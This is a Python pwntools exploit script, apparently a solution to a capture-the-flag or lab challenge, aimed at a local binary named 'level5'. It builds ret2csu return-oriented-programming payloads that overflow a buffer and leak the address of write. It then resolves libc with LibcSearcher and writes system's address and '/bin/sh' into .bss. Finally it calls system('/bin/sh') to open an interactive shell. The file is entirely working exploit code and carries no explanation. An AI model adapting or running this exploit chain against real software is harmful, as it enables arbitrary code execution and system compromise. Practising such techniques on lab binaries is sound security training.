#!/usr/bin/env python3
from pwn import *
from LibcSearcher import LibcSearcher

elf = ELF('level5')
p = process('./level5')

got_write = elf.got['write']
got_read = elf.got['read']
main_addr = 0x400564
bss_addr = 0x601028
gadget_pop = 0x400606
gadget_call = 0x4005F0

def construct_payload(call_target, arg1, arg2, arg3, return_addr):
    return (
        b"\x00" * 136 +
        p64(gadget_pop) + 
        p64(0) + p64(0) + p64(1) + p64(call_target) + 
        p64(arg1) + p64(arg2) + p64(arg3) +
        p64(gadget_call) +
        b"\x00" * 56 +
        p64(return_addr)
    )

payload1 = construct_payload(got_write, 1, got_write, 8, main_addr)
p.recvuntil(b"Hello, World\n")
print("\n############# Sending payload1 #############\n")
p.send(payload1)
sleep(1)
write_addr = u64(p.recv(8))
print("write_addr: " + hex(write_addr))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
sys_addr = libc_base + libc.dump('system')
print("system_addr: " + hex(sys_addr))
p.recvuntil(b"Hello, World\n")
payload2 = construct_payload(got_read, 0, bss_addr, 16, main_addr)
print("\n############# Sending payload2 #############\n")
p.send(payload2)
sleep(1)
p.send(p64(sys_addr) + b"/bin/sh\x00")
sleep(1)
p.recvuntil(b"Hello, World\n")
payload3 = construct_payload(bss_addr, bss_addr + 8, 0, 0, main_addr)
print("\n############# Sending payload3 #############\n")
sleep(1)
p.send(payload3)
p.interactive()
